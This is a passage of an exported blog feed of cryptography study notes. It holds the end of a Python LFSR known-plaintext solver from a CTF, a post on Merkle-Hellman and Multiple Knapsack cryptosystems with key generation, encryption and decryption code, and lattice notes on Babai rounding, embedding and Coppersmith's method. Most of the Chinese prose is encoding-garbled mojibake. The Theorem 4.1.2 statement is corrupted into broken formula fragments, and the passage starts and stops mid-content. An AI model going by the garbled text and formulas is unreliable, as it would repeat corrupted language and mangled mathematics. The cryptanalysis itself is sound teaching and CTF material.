class="line">    <span class="keyword">for</span> key_length <span class="keyword">in</span> range(<span class="number">2</span>, len(stream) // <span class="number">2</span>):</span><br><span class="line">        key, feedback = crack_key(stream, key_length)</span><br><span class="line">        <span class="keyword">if</span> (key, feedback) != (<span class="literal">False</span>, <span class="literal">False</span>):</span><br><span class="line">            cur = key</span><br><span class="line">            fw = open(<span class="string">'lsfr_&#123;&#125;.png'</span>.format(key_length), <span class="string">'wb'</span>)</span><br><span class="line">            plain = <span class="string">b''</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">                cur, byte = get_byte(cur, feedback)</span><br><span class="line">                plain += bytes([cipher[i] ^ byte])</span><br><span class="line">            fw.write(plain)</span><br><span class="line">            fw.close()</span><br><span class="line">            print(<span class="string">'lsfr_&#123;&#125;.png ok!'</span>.format(key_length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More-1"><a href="#More-1" class="headerlink" title="More"></a>More</h4><p>expå¯¹åº”2020iæ˜¥ç§‹å…¬ç›Šèµ›çš„ä¸€é“lfsr-kpaï¼ˆå·²çŸ¥pngæ–‡ä»¶å¤´ï¼Œä¸cipherå¼‚æˆ–å³å¯å°†é—®é¢˜è½¬åŒ–ä¸ºlfsr-kpaé—®é¢˜ï¼‰</p><p>lfsr-kpaå¯ä»¥ä¸å±€é™äºå¼€å¤´ï¼Œå¯†é’¥æµä¸­ä»»æ„æ®µå·²çŸ¥2nä¸ªbitå‡å¯è¿›è¡ŒæŠ½å¤´åºåˆ—çš„çŒœæµ‹ï¼ˆlfsråœ¨å·²çŸ¥nä¸ªè¿ç»­æ¯”ç‰¹å’ŒæŠ½å¤´åºåˆ—çš„æƒ…å†µä¸‹ä¸€å®šèƒ½æ¢å¤å®Œæ•´å¯†é’¥æµï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>About Knapsack</title>
      <link href="/2020/03/02/About-Knapsack/"/>
      <url>/2020/03/02/About-Knapsack/</url>
      
        <content type="html"><![CDATA[<h3 id="Basis"><a href="#Basis" class="headerlink" title="Basis"></a>Basis</h3><p>åŸºäºå­é›†å’Œé—®é¢˜ - $a_{1}x_{1}+â€¦+a_{n}x_{n}=E;\quad x_{i}\in\{0,1\}.$</p><p>Proved to be NP-hard.</p><p>ä½†Merkle-Hellman cryptosystemå­˜åœ¨trapdoor.</p><h4 id="Merkle-Hellman-cryptosystem"><a href="#Merkle-Hellman-cryptosystem" class="headerlink" title="Merkle-Hellman cryptosystem"></a>Merkle-Hellman cryptosystem</h4><p><strong>Key-Generation</strong></p><p>æœ‰éšæœºè¶…é€’å¢åºåˆ—$w=(w_{1},w_{2},â€¦,w_{n})$ï¼Œéšæœºæ•°$q&gt;\sum w_{i}$åŠéšæœºæ•°r (gcd(r, q) = 1)</p><p>å³å®šä¹‰åºåˆ—$\beta$ä¸­çš„å…ƒç´ $\beta_{i}\equiv rw_{i}(mod\ q),i\in[1,n]$. å…¬é’¥$\beta$ï¼Œç§é’¥$(w,q,r)$.</p><p><strong>Encryption</strong></p><p>n-bitæ˜æ–‡$\alpha=(\alpha_{1},\alpha_{2},â€¦,\alpha_{n})$. å¯†æ–‡$c=\sum\alpha_{i}\beta_{i}$.</p><p><strong>Decryption</strong></p><p>$câ€™\equiv cr^{-1}\equiv \sum\alpha_{i}w_{i}(mod\ q)$.</p><p>åˆ™ç”±$\sum\alpha_{i}w_{i}&lt;q$åŠè¶…é€’å¢åºåˆ—wæ˜“çŸ¥ï¼Œä»¤jä»n-1åˆ°0ï¼ŒèƒŒåŒ…å½“å‰å®¹é‡ä¸ºcæ—¶ï¼Œ</p><p>(1) $c&lt;w[j]\rightarrow m[j]=0,jâ€”;$</p><p>(2) $c\geq w[j]\rightarrow m[j]=1,c-=w[j],jâ€”;$</p><p>å³å¯æ¢å¤å‡ºæ˜æ–‡m.</p><p><strong>More Version</strong></p><p>é€‰å–ä¸€ä¸ªpermutation $\pi$ï¼Œåœ¨ç”Ÿæˆçš„$\beta$åºåˆ—åï¼Œå†ä»¤$\betaâ€™_{i}=\beta_{\pi(i)}$. å…¬å¼€åºåˆ—åˆ™ä¸º$\betaâ€™$. æŒæœ‰ç§é’¥åŠ å…¥$\pi$.</p><h3 id="The-Multiple-Knapsack-Cryptosystem"><a href="#The-Multiple-Knapsack-Cryptosystem" class="headerlink" title="The Multiple Knapsack Cryptosystem"></a>The Multiple Knapsack Cryptosystem</h3><h4 id="Key-Generation"><a href="#Key-Generation" class="headerlink" title="Key-Generation"></a>Key-Generation</h4><p>ç§é’¥ - å…­å…ƒç»„$(A,B,E,p,u,v)$ï¼Œå…¬é’¥ - ä¸‰å…ƒç»„$(F,G,H)$.</p><p>å…¶ä¸­ç§é’¥$A(\{a_i\}),B(\{b_i\}),C(\{c_i\})$æ»¡è¶³Condition 1, 2ï¼š</p><p><strong>Condition 1.</strong></p><script type="math/tex; mode=display">a_{k}\leq \sum_{i=1}^{k-1}a_{i},b_{k}\leq \sum_{i=1}^{k-1}b_{i}\quad (\forall k\in\{2,3,...,n\}).</script><p><strong>Condition 2.</strong></p><script type="math/tex; mode=display">e_{k}>-a_{k}b_{k}+(\sum_{i=1}^{k-1}a_{i})(\sum_{i=1}^{k-1}b_{i})+(\sum_{i=1}^{k-1}e_{i})\\-b_{1}(2^{n-1}-2^{k-1})(a_{k}-\sum_{i=1}^{k-1}a_{i})-a_{1}(2^{n-1}-2^{k-1})(b_{k}-\sum_{i=1}^{k-1}b_{i}).</script><p>[Q] - paperé‡Œæå‡ºçš„æ˜¯$a_{1}(2^{n-1}-2^{k-1})(a_{k}-\sum_{i=1}^{k-1}a_{i})$åŠ$b_{1}â€¦$ï¼Œä½†decryptionåŸç†æ¨å¯¼æ—¶ï¼Œä¸ªäººæ„Ÿè§‰å­˜åœ¨ä¸€å®šé—®é¢˜â€¦æ•…æ­¤å¤„ä¸paperä¸ä¸€.</p><p><strong>Algorithm (Generate A,B,E)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GenPriKnapsack</span><span class="params">(n)</span>:</span></span><br><span class="line">    a1, b1, e1 = getRandomNBitInteger(<span class="number">16</span>), getRandomNBitInteger(<span class="number">16</span>), getRandomNBitInteger(<span class="number">16</span>)</span><br><span class="line">    A, B, E = [a1], [b1], [e1]</span><br><span class="line">    a, b, e = a1, b1, e1</span><br><span class="line">    sum_a, sum_b, sum_e = a, b, e</span><br><span class="line">    tmp = <span class="number">2</span> ** (n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">        a = getRandomRange(sum_a // <span class="number">2</span>, sum_a)</span><br><span class="line">        b = getRandomRange(sum_b // <span class="number">2</span>, sum_b)</span><br><span class="line">        met = -a * b + sum_a * sum_b + sum_e - (tmp - <span class="number">2</span> ** (i + <span class="number">1</span>)) * (b1 * (a - sum_a) + a1 * (b - sum_b))</span><br><span class="line">        e = met + getRandomRange(<span class="number">2</span>**<span class="number">8</span>, <span class="number">2</span>**<span class="number">16</span>)</span><br><span class="line">        sum_a += a</span><br><span class="line">        sum_b += b</span><br><span class="line">        sum_e += e</span><br><span class="line">        A.append(a)</span><br><span class="line">        B.append(b)</span><br><span class="line">        E.append(e)</span><br><span class="line">    <span class="keyword">return</span> A, B, E</span><br></pre></td></tr></table></figure><p>ç”±Condition 1æˆ‘ä»¬æœ‰$a_{k}b_{k}\leq (\sum_{i=1}^{k-1}a_{i})(\sum_{i=1}^{k-1}b_{i})$ï¼Œä¸”èƒ½ç”±æ­¤å’ŒCondition 2æ¨å‡º$e_{k}&gt;\sum_{i=1}^{k-1}e_{i}$. (Superincreasing)</p><p><strong>Algorithm (Generate p,u,v)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = (sum_a * sum_b + sum_e) + getRandomRange(<span class="number">2</span>**<span class="number">8</span>, <span class="number">2</span>**<span class="number">16</span>)</span><br><span class="line">s = size(p) // <span class="number">2</span></span><br><span class="line">u, v = getPrime(s), getPrime(s)</span><br><span class="line"><span class="keyword">while</span> GCD(u, p) != <span class="number">1</span> <span class="keyword">or</span> GCD(v, p) != <span class="number">1</span>:</span><br><span class="line">    u, v = getPrime(s), getPrime(s)</span><br></pre></td></tr></table></figure><p><strong>Algorithm (Generate F,G,H)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F = [(u * _) % p <span class="keyword">for</span> _ <span class="keyword">in</span> A]</span><br><span class="line">G = [(v * _) % p <span class="keyword">for</span> _ <span class="keyword">in</span> B]</span><br><span class="line">H = [(u * v * _) % p <span class="keyword">for</span> _ <span class="keyword">in</span> E]</span><br></pre></td></tr></table></figure><h4 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h4><p>$M=(m_{1},m_{2},â€¦,m_{n})$ï¼Œæœ‰$C:=(\sum_{i=1}^{n}f_{i}m_{i})(\sum_{i=1}^{n}g_{i}m_{i})+\sum_{i=1}^{n}h_{i}m_{i}$.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(pubkey, m)</span>:</span></span><br><span class="line">    F, G, H = pubkey</span><br><span class="line">    n = len(F)</span><br><span class="line">    m = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(bytes_to_long(m))[<span class="number">2</span>:]]</span><br><span class="line">    m = [<span class="number">0</span>] * ((<span class="number">8</span> - len(m) % <span class="number">8</span>) % <span class="number">8</span>) + m</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m), n):</span><br><span class="line">        block_m = m[i : i + n]</span><br><span class="line">        <span class="keyword">if</span> len(block_m) != n:</span><br><span class="line">            padding = [getRandomRange(<span class="number">0</span>, <span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(n - len(block_m))]</span><br><span class="line">            block_m += padding</span><br><span class="line">        fm, gm, hm = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            fm += F[i] * block_m[i]</span><br><span class="line">            gm += G[i] * block_m[i]</span><br><span class="line">            hm += H[i] * block_m[i]</span><br><span class="line">        block_c = fm * gm + hm</span><br><span class="line">        c.append(hex(block_c)[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><h4 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h4><p>$D(C):=u^{-1}v^{-1}C(mod\ p)=(\sum_{i=1}^{n}a_{i}m_{i})(\sum_{i=1}^{n}b_{i}m_{i})+\sum_{i=1}^{n}e_{i}m_{i}$.</p><p>ç”±Condition 1. çŸ¥ï¼Œ$\sum_{i=1}^{k}a_{i}\leq 2^{k-1}a_{1},\sum_{i=1}^{k}b_{i}\leq 2^{k-1}b_{1}$ï¼Œæœ‰</p><p>$\because\sum_{i=1}^{k}a_{i}=2^{k-1}a_{1}-\Delta\quad\therefore\sum_{i=1}^{n}a_{i}\leq 2^{n-1}a_{1}-2^{n-k}\Delta$.</p><p>$\therefore\sum_{i=k+1}^{n}a_{i}=\sum_{i=1}^{n}a_{i}-\sum_{i=1}^{k}a_{i}\leq a_{1}(2^{n-1}-2^{k-1})$. åŒç†$\sum_{i=k+1}^{n}b_{i}\leq b_{1}(2^{n-1}-2^{k-1})$.</p><p>åˆç”±$(a_{k}-\sum_{i=1}^{k-1}a_{i})\leq 0,(b_{k}-\sum_{i=1}^{k-1}b_{i})\leq 0$åŠCondition 2. çŸ¥ï¼Œ</p><script type="math/tex; mode=display">e_{k}+a_{k}b_{k}-(\sum_{i=1}^{k-1}a_{i})(\sum_{i=1}^{k-1}b_{i})-(\sum_{i=1}^{k-1}e_{i})\\+(\sum_{i=k+1}^{n}b_{i})(a_{k}-\sum_{i=1}^{k-1}a_{i})+(\sum_{i=k+1}^{n}a_{i})(b_{k}-\sum_{i=1}^{k-1}b_{i})>0.</script><p>å¯çŸ¥ä¸Šå¼ä¸ºä¸‹å¼çš„å……åˆ†æ¡ä»¶</p><script type="math/tex; mode=display">e_{k}+a_{k}b_{k}-(\sum_{i=1}^{k-1}a_{i}m_{i})(\sum_{i=1}^{k-1}b_{i}m_{i})-(\sum_{i=1}^{k-1}e_{i}m_{i})\\+(\sum_{i=k+1}^{n}b_{i}m_{i})(a_{k}-\sum_{i=1}^{k-1}a_{i}m_{i})+(\sum_{i=k+1}^{n}a_{i}m_{i})(b_{k}-\sum_{i=1}^{k-1}b_{i}m_{i})>0.</script><p>åˆç­‰ä»·ä¸º</p><script type="math/tex; mode=display">(\sum_{i=k+1}^{n}a_{i}m_{i}+\sum_{i=1}^{k-1}a_{i}m_{i})(\sum_{i=k+1}^{n}b_{i}m_{i}+\sum_{i=1}^{k-1}b_{i}m_{i})+(\sum_{i=k+1}^{n}e_{i}m_{i}+\sum_{i=1}^{k-1}e_{i}m_{i})\\<(\sum_{i=k+1}^{n}a_{i}m_{i}+a_{k})(\sum_{i=k+1}^{n}b_{i}m_{i}+b_{k})+(\sum_{i=k+1}^{n}e_{i}m_{i}+e_{k})\tag{1}</script><p>ä¸”åœ¨$m_{k}=1$æ—¶ï¼Œæœ‰å¦ä¸€æ˜¾ç„¶æˆç«‹çš„ä¸ç­‰å¼å¦‚ä¸‹</p><script type="math/tex; mode=display">D(C)=(\sum_{i=1}^{n}a_{i}m_{i})(\sum_{i=1}^{n}b_{i}m_{i})+\sum_{i=1}^{n}e_{i}m_{i}\\\geq(\sum_{i=k+1}^{n}a_{i}m_{i}+a_{k})(\sum_{i=k+1}^{n}b_{i}m_{i}+b_{k})+(\sum_{i=k+1}^{n}e_{i}m_{i}+e_{k})\tag{2}</script><p>ç”±(1)(2)æœ‰ä»¥ä¸‹è§£å¯†ç®—æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(prikey, c)</span>:</span></span><br><span class="line">    A, B, E, u, v, p = prikey</span><br><span class="line">    n = len(A)</span><br><span class="line">    u_inv = inverse(u, p)</span><br><span class="line">    v_inv = inverse(v, p)</span><br><span class="line">    m = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> block_c <span class="keyword">in</span> c:</span><br><span class="line">        block_m = <span class="string">""</span></span><br><span class="line">        Dc = (u_inv * v_inv * int(block_c, <span class="number">16</span>)) % p</span><br><span class="line">        am, bm, em = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(n - <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">            d = (am + A[k]) * (bm + B[k]) + (em + E[k])</span><br><span class="line">            <span class="keyword">if</span> Dc &gt;= d:</span><br><span class="line">                block_m += <span class="string">"1"</span></span><br><span class="line">                am += A[k]</span><br><span class="line">                bm += B[k]</span><br><span class="line">                em += E[k]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                block_m += <span class="string">"0"</span></span><br><span class="line">        m = m + block_m[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(int(m, <span class="number">2</span>))</span><br></pre></td></tr></table></figure><h4 id="Code-For-Test"><a href="#Code-For-Test" class="headerlink" title="Code For Test"></a>Code For Test</h4><p><a href="MKS.py">MKS.py</a></p><h3 id="Attack-on-the-MKS-Cryptosystem"><a href="#Attack-on-the-MKS-Cryptosystem" class="headerlink" title="Attack on the MKS Cryptosystem"></a>Attack on the MKS Cryptosystem</h3><p>ç”±äºç§é’¥Aï¼ŒBå…·æœ‰ç›¸åŒçš„éè¶…é€’å¢æ€§è´¨ï¼Œæ‰€ä»¥è¯å…¶ä¸€å³å¯ï¼Œæˆ‘ä»¬ä»¤mä¸ºä¸€å°äºnçš„æ­£æ•´æ•°ï¼Œå®šä¹‰ä»¥ä¸‹åœ¨$N^{m}$ä¸Šçš„å‘é‡ï¼š</p><script type="math/tex; mode=display">f=(f_{1},...,f_{m}),a=(a_{1},...,a_{m})</script><p>ç”±äºæ”»å‡»è€…ä»…çŸ¥å…¬é’¥Féƒ¨åˆ†ï¼ŒæœªçŸ¥ç§é’¥Aï¼Œä½†æœ‰åŒä½™å…³ç³»$f\equiv ua(mod\ p)$ï¼Œå› æ­¤ç»™å‡ºä»¥ä¸‹å¼•ç†ï¼š</p><h4 id="Lemma-1"><a href="#Lemma-1" class="headerlink" title="Lemma 1"></a>Lemma 1</h4><p>ä»¤å‘é‡$x\in Z^{m}$ï¼Œè‹¥$x\perp f$ï¼Œåˆ™æœ‰$x\perp a$æˆ–$|x|\geq \frac{p}{|a|}$.</p><p><strong>Proof.</strong> æœ‰$<x,f>\equiv 0(mod\ p)$ï¼Œè‹¥å‡è®¾xä¸ä¸aæ­£äº¤ï¼Œåˆ™æœ‰$|<x,a>|\geq p$ï¼ˆå› ä¸º$gcd(u,p)=1$ï¼‰ï¼Œå†ç”±æŸ¯è¥¿ä¸ç­‰å¼å¯çŸ¥$P\leq |x||a|$.</x,a></x,f></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lattice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lattice-Learning-2</title>
      <link href="/2020/02/29/Lattice-Learning-2/"/>
      <url>/2020/02/29/Lattice-Learning-2/</url>
      
        <content type="html"><![CDATA[<h2 id="Chapter-3-Algorithm-for-the-Closest-and-Shortest-Vector-Problems"><a href="#Chapter-3-Algorithm-for-the-Closest-and-Shortest-Vector-Problems" class="headerlink" title="Chapter 3    Algorithm for the Closest and Shortest Vector Problems"></a>Chapter 3    Algorithm for the Closest and Shortest Vector Problems</h2><h3 id="3-1-Babaiâ€™s-Rounding-Technique"><a href="#3-1-Babaiâ€™s-Rounding-Technique" class="headerlink" title="3.1    Babaiâ€™s Rounding Technique"></a>3.1    Babaiâ€™s Rounding Technique</h3><p><strong>Theorem 3.1.1.</strong> Given a vector we can write $\underline{\omega}=\sum_{i=1}^{n}\alpha_{i}\underline{b_{i}}$ with $\alpha_{i}\in R$. The rounding technique is simply to set</p><script type="math/tex; mode=display">\underline{v}=\sum_{i=1}^{n}\lfloor \alpha_{i}\rceil\underline{b_{i}}</script><p>$\left|\underline{v}-\underline{w}\right|$ is within an exponential factor of the minimal value if the basis is LLL-Reduced. The method trivially generalises to non-full-rank lattices as long as $\underline{\omega}$ lies in the R-span of the basis.</p><p><strong>Theorem 3.1.2.</strong> Let $\{\underline{b}_{1},â€¦,\underline{b}_{n}\}$ be an LLL-Reduced basis (with factor $\delta=\frac{3}{4}$) for a Lattice $L\subset R^{n}$. Then the output $\underline{v}$ of the Babai rounding method on input $\underline{\omega}\in R^{n}$ satisfies</p><script type="math/tex; mode=display">\left\|\underline{\omega}-\underline{v}\right\|\leq (1+2n(9/2)^{n/2})\left\|\underline{\omega}-\underline{u}\right\|</script><p>for all $\underline{u}\in L$.</p><h3 id="3-2-The-Embedding-Technique"><a href="#3-2-The-Embedding-Technique" class="headerlink" title="3.2    The Embedding Technique"></a>3.2    The Embedding Technique</h3><p><strong>Theorem 3.2.1.</strong> Embeddingâ€™s solution to the CVP  corresponds to integers $l_{1},â€¦,l_{n}$ such that</p><script type="math/tex; mode=display">\underline{\omega}\approx\sum_{i=1}^{n}l_{i}\underline{b_{i}}</script><p>The idea is to define a lattice Lâ€™ that contains the short vector $\underline{e}(\underline{e}=\underline{\omega}-\sum_{i=1}^{n}l_{i}\underline{b_{i}})$. Let $M\in R_{&gt;0}$ (usually let M=1). The lattice Lâ€™ is defined by the vectors (which are a basis for $R^{n+1}$)</p><script type="math/tex; mode=display">(\underline{b_{1}},0),...,(\underline{b_{n}},0),(\underline{\omega},M)</script><p>Hence, we might be able to find $\underline{e}$ by solving the SVP problem in the lattice Lâ€™. Then we can solve the CVP by subtracting $\underline{e}$ from $\underline{\omega}$.</p><p>Example: the CVP whose basis is for $R^{1}$</p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-2/image-20200302001321511.png" alt></p><p>add $(\underline{\omega},M)$ to define Lâ€™ in $R^{2}$</p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-2/image-20200302001737673.png" alt></p><p>solving the SVP to find $\delta$</p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-2/image-20200302001826288.png" alt></p><p><strong>Lemma 3.2.2.</strong> Let $\{\underline{b}_{1},â€¦,\underline{b}_{n}\}$ be a basis for a lattice $L\subset Z^{n}$ and donate by $\lambda_1$ the shortest Euclidean length of a non-zero element of L. Let $\underline{\omega}\in R^{n}$ and let $\underline{v}\in L$ be a closest lattice point to $\underline{\omega}$. Define $\underline{e}=\underline{\omega}-\underline{v}$. Suppose that $\left|\underline{e}\right|&lt;\lambda_1/2$ and let $M=\left|\underline{e}\right|$. Then $(\underline{e},M)$ is a shortest non-zero vector in the lattice Lâ€™ of the embedding technique.</p><p>Proof: All vectors in Lâ€™ are of the form</p><script type="math/tex; mode=display">l_{n+1}(\underline{e},M)+\sum_{i=1}^{n}l_{i}(\underline{b}_{1},0)</script><p>for some $l_{i}\in Z$. It is clear that every non-zero vector with $l_{n+1}=0$ is of length at least $\lambda_{1}$.</p><p>Since $\left|(\underline{e},M)\right|^{2}=\left|\underline{e}\right|^{2}+M^{2}=2M^{2}&lt;\frac{\lambda^{2}}{2}$, the vector $(\underline{e},M)$ has length at most $\frac{\lambda_1}{\sqrt{2}}$. Since $\underline{v}$ is a closest vector to $\underline{\omega}$ in the lattice L, $\forall_{\underline{x}\in L},s.t.\left|\underline{e}\right|\leq \left|\underline{e}+\underline{x}\right|$. SVPâ€™s correctness proved.</p><h3 id="3-3-Korkine-Zolotarev-Bases"><a href="#3-3-Korkine-Zolotarev-Bases" class="headerlink" title="3.3    Korkine-Zolotarev Bases"></a>3.3    Korkine-Zolotarev Bases</h3><blockquote><p>Schnorr has developed the block Korkine-Zolotarev lattice basis reduction algorithm, which computes a Korkine-Zolotarev basis for small dimensional projections of the original lattice and combines this with the LLL algorithm. The output basis can be proved to be of a better quality than an LLL-reduced basis. This is the most powerful algorithm for fifinding short vectors in lattices of large dimension. </p></blockquote><h2 id="Chapter-4-Coppersmithâ€™s-Method-and-Related-Applications"><a href="#Chapter-4-Coppersmithâ€™s-Method-and-Related-Applications" class="headerlink" title="Chapter 4    Coppersmithâ€™s Method and Related Applications"></a>Chapter 4    Coppersmithâ€™s Method and Related Applications</h2><h3 id="4-1-Coppersmithâ€™s-Method-for-Modular-Univariate-Polynomials"><a href="#4-1-Coppersmithâ€™s-Method-for-Modular-Univariate-Polynomials" class="headerlink" title="4.1    Coppersmithâ€™s Method for Modular Univariate Polynomials"></a>4.1    Coppersmithâ€™s Method for Modular Univariate Polynomials</h3><h4 id="4-1-1-First-Steps-to-Coppersmithâ€™s-Method"><a href="#4-1-1-First-Steps-to-Coppersmithâ€™s-Method" class="headerlink" title="4.1.1    First Steps to Coppersmithâ€™s Method"></a>4.1.1    First Steps to Coppersmithâ€™s Method</h4><p>Let $F(x)=x^{d}+a_{d-1}x^{d-1}+â€¦+a_{1}x+a_{0}$ be a monic polynomial of degree d with integer coefficients. Suppose we know that there exist one or more integers $x_{0}$ such that $F(x)\equiv 0(mod\ M)$ and that $x_{0}&lt;M^{\frac{1}{d}}$. The problem is to find all such roots.</p><p>Since $|x_{0}^{i}|&lt;M$ for all $0\leq i\leq d$ then, if the coefficients of F(x) are small enough, one might have $F(x_{0})=0$ over Z. In this case, the problem can be easily solved by Newtonâ€™s method (round the approximations of the roots to the nearest integer and check whether they are solutions of F(x)). However, we wanna deal with polynomials F(x) having a small solution but whose coefficients are not small.</p><p>Coppersmithâ€™s idea is to build from F(x)  a polynomial <strong>G(x)</strong> that still has the same solution $x_{0}$, but which has <strong>coefficients small enough</strong>.</p><p><strong>Theorem 4.1.1.</strong> (Howgrave-Graham [296]) Let $M, X\in N$ and let $F(x)=\sum_{i=0}^{d}a_{i}x^{i}\in Z[x]$. Suppose $x_{0}\in Z$ is a solution to $F(x)\equiv 0(mod\ M)$ such that $|x_{0}|&lt;X$. We associate with the polynomial F(x) the row vector $b_F=(a_0,a_{1}X,a_{2}X^{2},â€¦,a_{d}X^{d})$. If $\left|b_{F}\right|&lt;\frac{M}{\sqrt{d+1}}$ then $F(x_{0})=0$.</p><p><strong>Proof:</strong> Cauchy-Schwarz inequality $\rightarrow\sum_{i=1}^{n}x_{i}\leq \sqrt{n\sum_{i=1}^{n}x_{i}^{2}}$.</p><p>So, $|F(x_{0})|=|\sum_{i=0}^{d}a_{i}x_{0}^{i}|\leq \sum_{i=0}^{d}|a_{i}||x_{0}|^{i}\leq \sum_{i=0}^{d}|a_{i}|X^{i}\leq \sqrt{d+1}\left|b_{F}\right|&lt;\sqrt{d+1}\frac{M}{\sqrt{d+1}}=M$.</p><p>$\therefore F(x_{0})=0$.</p><p>Then how to transform F(x) to G(x) we need?</p><p>To do this, consider the d+1 polynomials $G_{i}(x)=Mx^{i}$ for $0\leq i&lt;d$ and F(x). They all have the solution $x=x_{0}$ module M. Define the lattice L with the basis B</p><script type="math/tex; mode=display">B=\left( \begin{matrix}   M & 0 & ... & 0 & 0 \\   0 & MX & ... & 0 & 0 \\   ... & ... & ... & ... & ... \\   0 & 0 & ... & MX^{d-1} & 0 \\   a_0 & a_1X & ... & a_{d-1}X^{d-1} & X^{d}  \end{matrix} \right).</script><p><strong>Theorem 4.1.2.</strong> Let G(x) be the polynomial corresponding to the first vector $\underline{b}_{1}$ in the LLL-Reduced basis for L. Set $c_{1}(d)=2^{-\frac{1}{2}}(d+1)^{-\frac{1}{d}}$. If $X<c_{1}(d)\cdot m^{\frac{2}{d(d+1)}}$ then any root $x_{0}$ of f(x) module m such that $|x_{0}|\leq x$ satisfies $g(x_{0})="0$" in z. (i.e., if $\sqrt{d+1}\cdot 2^{\frac{d}{4}}\cdot x^{\frac{d}{2}}<m^{\frac{1}nan}$, â€¦)< p><h4 id="4-1-2-The-Full-Coppersmith-Method"><a href="#4-1-2-The-Full-Coppersmith-Method" class="headerlink" title="4.1.2    The Full Coppersmith Method"></a>4.1.2    The Full Coppersmith Method</h4><p>Compared to previous section, some benefits can be obtained by using x-shifts. (Get larger X)</p><p><strong>Theorem 4.1.3.</strong> (Coppersmith) Let $0&lt;\epsilon&lt;min\{0.18,\frac{1}{d}\}$. Let F(x) be a monic polynomial of degree d with one or more small roots $x_{0}$ module M such that $|x_{0}|&lt;\frac{1}{2}M^{\frac{1}{d}-\epsilon}$. Then $x_{0}$ can be found in time bounded by a polynomial in d, $\frac{1}{\epsilon}$ and log(M).</p><h3 id="4-2-Multivariate-Modular-Polynomial-Equations"><a href="#4-2-Multivariate-Modular-Polynomial-Equations" class="headerlink" title="4.2    Multivariate Modular Polynomial Equations"></a>4.2    Multivariate Modular Polynomial Equations</h3><p><strong>Theorem 4.2.1.</strong> Let $F(x,y)\in Z[x,y]$ be a polynomial of total degree d (i.e., every monomial $x^{i}y^{j}$ satisfies $i+j\leq d$). Let $X,Y,M\in N$ be such that $XY<M^{\frac{1}{d}-\epsilon}$ for some $0<\epsilon <\frac{1}{d}$. then one can compute (in time polynomial in log(m) and $\frac{1}{\epsilon}>d$) polynomials $F_{1}(x,y),F_{2}(x,y)\in Z[x,y]$ such that, for all $(x_{0},y_{0})\in Z^{2}$ with 